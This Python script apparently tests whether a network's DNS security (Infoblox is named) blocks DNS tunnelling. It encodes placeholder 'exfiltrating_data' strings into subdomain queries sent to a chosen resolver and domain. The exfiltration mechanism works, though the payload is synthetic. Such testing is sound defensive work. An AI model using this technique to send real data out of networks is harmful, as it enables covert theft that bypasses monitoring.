import base64
import random
import string
import time
import argparse
import dns.resolver

def generate_chunk(session_id, chunk_id):
    raw_data = f"chunk{chunk_id}_session_{session_id}_exfiltrating_data"
    encoded = base64.urlsafe_b64encode(raw_data.encode()).decode().rstrip("=")
    return encoded

def simulate_dns_exfiltration(resolver_ip, target_domain, num_chunks):
    print(f"[+] Simulating DNS Exfiltration via {resolver_ip}")
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [resolver_ip]

    query_types = ["A", "TXT", "NULL"]
    session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    success_count = 0

    for i in range(num_chunks):
        encoded_chunk = generate_chunk(session_id, i)
        fqdn = f"{encoded_chunk}.{target_domain}"
        qtype = random.choice(query_types)

        try:
            resolver.resolve(fqdn, qtype)
            print(f"[{i+1}] Sent: {fqdn} ({qtype}) ✅")
            success_count += 1
        except Exception:
            print(f"[{i+1}] BLOCKED or NXDOMAIN for: {fqdn} ({qtype}) ❌")
        time.sleep(0.2)

    print("\n=== Summary ===")
    if success_count > 0:
        print(f"[✓] {success_count}/{num_chunks} queries succeeded. Exfiltration is POSSIBLE. 💀")
    else:
        print(f"[✘] All queries were blocked or NXDOMAIN. Infoblox is likely blocking them. 🔐")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate DNS exfiltration")
    parser.add_argument('--resolver', required=True, help='DNS server IP')
    parser.add_argument('--domain', required=True, help='Target domain')
    parser.add_argument('--chunks', type=int, default=20, help='Number of DNS queries to simulate')
    args = parser.parse_args()

    simulate_dns_exfiltration(args.resolver, args.domain, args.chunks)
